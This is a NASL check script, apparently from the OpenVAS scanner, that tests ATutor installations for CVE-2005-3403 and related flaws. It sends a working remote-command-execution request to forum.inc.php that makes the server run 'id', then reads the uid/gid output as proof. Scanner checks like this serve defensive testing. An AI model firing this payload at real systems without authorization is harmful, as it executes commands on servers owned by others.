# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:atutor:atutor";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20095");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3403", "CVE-2005-3404", "CVE-2005-3405");
  script_xref(name:"OSVDB", value:"20344");
  script_xref(name:"OSVDB", value:"20345");
  script_xref(name:"OSVDB", value:"20346");
  script_xref(name:"OSVDB", value:"20347");
  script_xref(name:"OSVDB", value:"20348");
  script_xref(name:"OSVDB", value:"20349");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("ATutor < 1.5.1-pl1 Multiple Flaws");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("gb_atutor_detect.nasl");
  script_mandatory_keys("atutor/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/secunia_research/2005-55/advisory/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15221");

  script_tag(name:"solution", value:"Apply patch 1.5.1-pl1 or upgrade to version 1.5.2 or later.");

  script_tag(name:"summary", value:"The remote web server contains a PHP application that is prone to multiple
  flaws.

  The remote host is running ATutor, an open-source web-based Learning
  Content Management System (LCMS) written in PHP.

  The version of ATutor installed on the remote host may be vulnerable
  to arbitrary command execution, arbitrary file access, and cross-site
  scripting attacks.  Successful exploitation of the first two issues
  requires that PHP's 'register_globals' setting be enabled and, in some
  cases, that 'magic_quotes_gpc' be disabled.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/login.php";

url = dir + "/include/html/forum.inc.php?addslashes=system&asc=id";

req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );

# Isolate command output.
pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
matches = egrep( string:res, pattern:pat );
if( matches ) {
  foreach match( split( matches ) ) {
    match = chomp( match );
    output = eregmatch( pattern:pat, string:match );
    if( ! isnull( output ) ) {
      output = output[1];
      break;
    }
 }
}

# If that didn't work, perhaps just the system function is disabled.
if( isnull( output ) ) {
  matches = egrep( pattern:"system\(\) has been disabled for security reasons", string:res );
  if( matches ) {
    output = "";
    foreach match( split( matches ) ) {
      output += match;
    }
  }
}

if( output ) {
  security_message( port:port, data:output );
  exit( 0 );
}

exit( 99 );
